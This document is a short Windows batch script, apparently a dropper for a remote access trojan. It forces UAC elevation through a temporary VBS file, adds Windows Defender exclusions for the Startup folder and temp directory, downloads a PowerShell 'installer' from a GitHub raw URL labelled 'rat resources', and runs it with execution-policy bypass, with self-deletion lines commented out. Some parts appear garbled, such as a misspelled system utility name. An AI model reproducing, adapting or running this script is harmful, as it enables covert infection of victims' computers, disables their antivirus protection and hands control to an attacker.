@REM get admin permissions for script
@echo off
:: BatchGotAdmin
:---------------------------------------
@REM --> check for permissions
    IF "%PROCESSOR_ARCHITECTURES%" EQU "amd64" (
        >nul 2>&1 "%SYSTEMROOT%\SysWOW64\calcs.exe"
        "%SYSTEMROOT%\SysWOW64\config\system"
    ) ELSE (
        >nul 2>&1 "%SYSTEMROOT%\system32\calcs.exe"
        "%SYSTEMROOT%\system32\config\system"
    )

    @REM --> if error flag set, we do not have admin.
    if '%errorlevel%' NEQ '0' (
        echo Requesting administrative priviledges...
        goto UACPrompt
    ) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) >
    "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "",
    "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

@REM disable defender

@REM rat resources

powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/Dukk3D3nnis/resources/refs/heads/main/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"

powershell powershell.exe -ep bypass "./installer.ps1"

@REM self delete
@REM del wget.cmd
